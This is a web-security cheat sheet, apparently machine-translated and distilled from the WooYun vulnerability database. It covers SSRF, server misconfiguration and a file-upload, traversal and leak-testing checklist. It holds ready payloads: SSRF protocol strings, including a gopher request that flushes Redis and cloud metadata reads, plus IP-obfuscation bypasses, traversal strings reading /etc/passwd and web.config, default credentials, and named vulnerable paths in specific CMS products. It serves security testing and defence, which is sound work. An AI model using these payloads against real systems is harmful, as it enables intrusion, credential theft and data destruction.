# Web Security - SSRF、Server configuration error、Comprehensive Checklist

> Source: WooYun Vulnerability database | Dismantled From web-file-infra.md(SSRF + Configuration error + Checklist + CMS/URL Appendix)

## Four、SSRFWith protocol utilization

### 4.1 Nature of vulnerabilities

```
SSRFEssence: Request initiated on behalf of the server,Attacker controls the request target
Risk: Internal network detection -> Internal service access -> File reading -> Command execution
```

### 4.2 Common trigger points

- In the file download functionurlParameters
- Image loading/Proxy function
- Web page preview/Screenshot Function
- ImportURLFunction
- Webhook/Callback configuration

### 4.3 Protocol Exploitation

```bash
# file:// - Arbitrary file read
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - Port Scanning/Service interaction
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - Construct arbitraryTCPRequest
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - Internal network detection
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # Cloud metadata
```

### 4.4 Bypassing techniques

```bash
# IPObfuscation bypass
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNSRebinding: Parse to externalIPQuickly switch to127.0.0.1
# Short Link/302Jump: Through externalURLJump to the internal network address
```

### 4.5 Defensive measures

1. Whitelist restriction: Restrict request target domain name/IP
2. Protocol limitations: Only allowhttp/https
3. Internal Network Isolation: Forbidden requests.RFC1918Address and127.0.0.1
4. DNSParsing verification: Re-validate after parsingIPAttribution
5. Disable redirection: Or limit the number of redirects and verify again

---

## Five、Server configuration error

### 5.1 Parsing configuration error

| Issue | Risk | Check method |
|-----|------|---------|
| IIS 6.0Parsing Vulnerability Unfixed | `shell.asp;.jpg`Executable | upload file with semicolon in filename test |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php`Parsed asPHP | Upload image access`/img.jpg/x.php` |
| ApacheMulti-suffix resolution | `shell.php.xxx`Parsed | Upload double extension file for testing |
| Upload executable script in directory | WebshellRun directly | Upload script file for testing |
| Directory listing enabled | Expose all files | Access directory.URLView |

### 5.2 Permission Configuration Errors

| Issue | Risk | Fix |
|-----|------|------|
| WebProcess Running with High Privileges | Directly after Privilege Escalationroot | Run with low-privilege users |
| Upload directory777Permissions | Arbitrary Write+Execute | Settings644/755 |
| Configuration file readable | Credential leakage | Move outWebDirectory,Restrict permissions |
| No management backendIPRestrict | Publicly accessible | IPWhitelist/VPN |

### 5.3 Default configuration risks

```bash
# Default management backend path
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# Default Credentials (High Frequency)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# Default Debugging Port
8080 (Tomcat) | 9090 (Management) | 3306 (MySQLExternal network)
6379 (RedisNo password) | 27017 (MongoDBNo authentication)
```

### 5.4 Spring Boot ActuatorDisclosure

```bash
/actuator/env          # Environment Variables(Containing Passwords)
/actuator/configprops  # Configuration properties
/actuator/heapdump     # Heap memory dump(Contains sensitive data)
/actuator/mappings     # AllURLMapping
```

---

## Six、Comprehensive practical combatChecklist

### 6.1 File upload testing

- [ ] scan common editor paths(FCKeditor/eWebEditor/UEditor)
- [ ] DisableJavaScriptTest front-end validation
- [ ] Test extension bypass: Case sensitivity/Double Write/Special suffix/%00Truncate/Semicolon truncation
- [ ] ModifyContent-TypeForimage/jpeg
- [ ] AddGIF89aFile header / Create image horses
- [ ] Identify server types,Test corresponding parsing vulnerabilities
- [ ] Testing.htaccess/.user.iniUpload Hijacking Parsing
- [ ] Analyze file naming rules,Test path brute force
- [ ] Test race condition upload

### 6.2 File traversal testing

- [ ] Identify file-related parameters(filename/path/file/url/download)
- [ ] Basic traversal: `../../../../../etc/passwd`
- [ ] WindowsTesting: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] URLEncoding bypass: `%2e%2e%2f` / Double encoding `%252e%252e%252f`
- [ ] UnicodeBypass: `%c0%ae%c0%ae/`
- [ ] Null byte truncation: `../etc/passwd%00.jpg`
- [ ] Absolute path: `/etc/passwd` / `file:///etc/passwd`

### 6.3 Information leakage scanning

- [ ] Version control: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] Backup Files: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] Configuration backup: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] Environment file: `/.env` `/.env.production`
- [ ] Probe file: `/phpinfo.php` `/info.php` `/test.php`
- [ ] Log file: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] Management interface: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Google HackingSyntax-assisted search

### 6.4 SSRFTesting

- [ ] IdentificationURL/Proxy/Callback parameter
- [ ] Testingfile:///etc/passwdProtocol reading
- [ ] Test intranet address: http://127.0.0.1:port
- [ ] Cloud metadata: http://169.254.169.254/latest/meta-data/
- [ ] IPObfuscation bypass: Hexadecimal/Decimal/Omission writing
- [ ] DNSRebinding/302Jumping bypass

---

## AppendixA: High riskCMSVulnerability quick reference

| CMS/System | Vulnerability type | Path | Conditions |
|---------|---------|------|------|
| Ten thousand householdsOA ezOffice | Arbitrary upload | `/defaultroot/dragpage/upload.jsp` | %00Truncate |
| YouFriend collaboration platform | Arbitrary upload | `/oaerp/ui/sync/excelUpload.jsp` | BypassJS+Bruteforce Filename |
| KingdeeGSiS | Arbitrary upload | `/kdgs/core/upload/upload.jsp` | Registered Users |
| Jinzhi Educationepstar | File traversal | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | No authentication required |
| Reach far.OA | Log leakage | `/ctp.log` | Direct access |


## AppendixC: General vulnerabilitiesURLPattern

```bash
# PHPFile traversal
/down.php?filename=../../../etc/passwd
/pic.php?url=[base64Encoding path]

# JSPFile traversal
/download.jsp?path=../WEB-INF/web.xml
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPXFile traversal
/DownLoad.aspx?Accessory=../web.config
/download.ashx?file=../../../web.config

# ResinUnique
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

> **Supply chain/Cloud Deployment/FrameworkCVE** → Migrated to [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTPSmuggling/WebSocket/OAuth** → Migrated to [web-modern-protocols.md](web-modern-protocols.md)

*Based onWooYunVulnerability database(88,636Item.)Refine | For security research and defense reference only*
